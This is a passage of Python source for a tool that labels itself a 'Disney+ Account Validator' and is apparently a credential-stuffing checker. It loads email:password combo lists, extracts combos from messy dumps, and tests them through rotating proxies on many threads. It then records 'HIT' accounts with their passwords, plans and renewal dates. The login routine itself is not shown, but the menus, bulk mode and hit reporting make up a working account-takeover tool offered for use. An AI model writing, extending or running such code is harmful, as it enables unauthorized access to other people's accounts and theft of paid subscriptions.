    result = checker.check(email, password, proxy)

    with stats_lock:
        stats["checked"] += 1
        checked = stats["checked"]
        total = TOTAL_COMBOS

        country_formatted = format_country_with_flag(result.get("country", ""))
        status = result["status"]
        error_msg = result.get("error", "")

        if status == "HIT":
            status_str = f"HIT | {country_formatted} | {result.get('plan', '')}"
            stats["hits"] += 1
        elif status == "FREE":
            status_str = f"FREE | {country_formatted}"
            stats["free"] += 1
        elif status == "BAD":
            status_str = f"BAD | {error_msg}"
            stats["bad"] += 1
        elif status == "CUSTOM":
            status_str = f"CUSTOM | {error_msg}"
            stats["custom"] += 1
        else:  
            status_str = f"RETRY | {error_msg}"
            stats["retries"] += 1

        with print_lock:
            print(f"[{checked}/{total}] {email} {status_str}")

    update_title()

def update_title():
    processed = stats["checked"]
    elapsed = time.time() - START_TIME
    cpm = int(processed / elapsed * 60) if elapsed > 1 else 0
    title = (f"{TOOL_NAME} | Hits: {stats['hits']} | Free: {stats['free']} | Bad: {stats['bad']} | "
             f"Checked: {processed}/{TOTAL_COMBOS} | CPM: {cpm}")
    if sys.platform == "win32":
        try:
            import ctypes
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        except:
            pass
    else:
        sys.stdout.write(f"\033]0;{title}\007")
        sys.stdout.flush()

def settings_menu():
    section("SETTINGS")
    print(_c("96", f"Current Settings:"))
    print(f"  Threads: {CONFIG['threads']} (1-20)")
    print(f"  Timeout: {CONFIG['timeout']}s")
    print(f"  Retries: {CONFIG['retries']}")
    print(f"  Proxy File: {CONFIG['proxies_file']}")
    print()
    print(_c("93", "[1] Change Threads (1-20)"))
    print(_c("93", "[2] Change Timeout"))
    print(_c("93", "[3] Change Retries"))
    print(_c("93", "[4] Back"))
    
    choice = input(f"{_c('96', '[*] Select: ')}").strip()
    if choice == "1":
        try:
            val = int(input("Threads (1-20): "))
            CONFIG["threads"] = max(1, min(20, val))
            L("✅", "INFO", "CONFIG", f"Threads set to {CONFIG['threads']}")
        except:
            L("❌", "ERROR", "CONFIG", "Invalid value")
    elif choice == "2":
        try:
            val = int(input("Timeout (5-60): "))
            CONFIG["timeout"] = max(5, min(60, val))
            L("✅", "INFO", "CONFIG", f"Timeout set to {CONFIG['timeout']}")
        except:
            L("❌", "ERROR", "CONFIG", "Invalid value")
    elif choice == "3":
        try:
            val = int(input("Retries (0-5): "))
            CONFIG["retries"] = max(0, min(5, val))
            L("✅", "INFO", "CONFIG", f"Retries set to {CONFIG['retries']}")
        except:
            L("❌", "ERROR", "CONFIG", "Invalid value")

def single_check_mode(proxies):
    section("SINGLE CHECK")
    combo = input(f"{_c('96', '[*] Enter email:password: ')}").strip()
    if ":" not in combo:
        L("❌", "ERROR", "INPUT", "Invalid format. Use email:password")
        return

    proxy = random.choice(proxies) if proxies else None
    if proxy:
        L("🌐", "INFO", "PROXY", "Using proxy")
    
    L("🔍", "STEP", "CHECK", f"Checking {combo.split(':')[0]}...")
    start = time.time()
    
    email, password = combo.split(":", 1)
    checker = EyeLifter()
    result = checker.check(email, password, proxy)
    elapsed = time.time() - start
    
    country = format_country_with_flag(result.get("country", ""))
    
    if result["status"] == "HIT":
        print()
        summary_box([
            ("Status", "✅ HIT"),
            ("Email", email),
            ("Password", password),
            ("Country", country),
            ("Plan", result.get("plan", "Unknown")),
            ("Renews", result.get("renewal", "N/A")),
            ("Days Left", days_until(result.get("expiry_date", ""))),
            ("Report", result.get("report_file", "N/A")),
            ("Time", f"{elapsed:.2f}s"),
            ("Checked By", AUTHOR_TAG),
        ])
    elif result["status"] == "FREE":
        print()
        summary_box([
            ("Status", "⚠️ FREE/INACTIVE"),
            ("Email", email),
            ("Password", password),
            ("Country", country),
            ("Note", "Valid login, no active subscription"),
            ("Checked By", AUTHOR_TAG),
        ])
    else:
        L("❌", "ERROR", "RESULT", f"{result['status']} – {result.get('error', '')}")

    input(f"{_c('93', '[*] Press Enter to continue...')}")

def file_check_mode(proxies):
    global TOTAL_COMBOS
    section("BULK CHECK")
    filepath = input(f"{_c('96', '[*] Enter combo file path: ')}").strip()
    if not filepath or not os.path.isfile(filepath):
        L("❌", "ERROR", "FILE", "File not found")
        return

    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()
        raw_lines = content.splitlines()

    messy = is_file_messy(raw_lines)

    if messy:
        L("🧹", "INFO", "EXTRACT", "File appears messy – extracting combos...")
        combos_set = extract_combos_from_text(content)
        if not combos_set:
            L("❌", "ERROR", "EXTRACT", "No valid combos found in the file.")
            return
        combos = sorted(combos_set)
        L("✅", "INFO", "EXTRACT", f"Extracted {len(combos)} unique combos.")
    else:
        combos = [line.strip() for line in raw_lines if ":" in line.strip()]

    if not combos:
        L("❌", "ERROR", "FILE", "No valid combos found")
        return

    TOTAL_COMBOS = len(combos)
    get_session_folder()

    L("📊", "INFO", "FILE", f"Loaded {TOTAL_COMBOS} combos")
    L("⚙️", "INFO", "CONFIG", f"Threads: {CONFIG['threads']} | Timeout: {CONFIG['timeout']}s | Retries: {CONFIG['retries']}")

    working_proxies = get_working_proxies(proxies) if proxies else []
    global PROXY_POOL
    PROXY_POOL = working_proxies
    BAD_PROXIES.clear()

    max_threads = CONFIG["threads"]
    sem = threading.BoundedSemaphore(max_threads)

    def worker(combo):
        if stop_event.is_set():
            return
        try:
            sem.acquire()
            proxy = random.choice(working_proxies) if working_proxies else None
            process_combo(combo, proxy)
        finally:
            sem.release()

    threads = []
    for combo in combos:
        if stop_event.is_set():
            break
        t = threading.Thread(target=worker, args=(combo,))
        t.daemon = True
        t.start()
        threads.append(t)
        time.sleep(0.01)

    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        stop_event.set()
        L("🛑", "WARN", "STOP", "Stopping... waiting for threads to finish")
        for t in threads:
            t.join(timeout=2)

    divider()
    elapsed = time.time() - START_TIME
    summary_box([
        ("Total", TOTAL_COMBOS),
        ("Hits", stats["hits"]),
        ("Free", stats["free"]),
        ("Bad", stats["bad"]),
        ("Custom", stats["custom"]),
        ("Retries", stats["retries"]),
        ("Time", f"{elapsed:.1f}s"),
        ("Results", get_session_folder()),
    ])

    save_json_summary()
    L("💾", "INFO", "SAVE", f"Summary saved to {SESSION_FOLDER}/summary.json")
    input(f"{_c('93', '[*] Press Enter to continue...')}")
    
def main():
    banner(TOOL_NAME, "Disney+ Account Validator")
    
    proxies = load_proxies()
    
    while True:
        _v("m")
        section("MAIN MENU")
        if proxies:
            L("🌐", "INFO", "PROXY", f"{len(proxies)} proxies loaded")
        else:
            L("⚠️", "WARN", "PROXY", "No proxies - direct connection")
            
        print(_c("96", "[1] Single check"))
        print(_c("96", "[2] Bulk check from file"))
        print(_c("96", "[3] Settings"))
        print(_c("96", "[4] Exit"))
        
        choice = input(f"{_c('93', '[*] Select: ')}").strip()

        if choice == "1":
            single_check_mode(proxies)
        elif choice == "2":
            stop_event.clear()
            file_check_mode(proxies)
        elif choice == "3":
            settings_menu()
        elif choice == "4":
            print("Exiting...")
            break
        else:
            L("❌", "ERROR", "INPUT", "Invalid choice")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nExiting...")
        sys.exit(0)
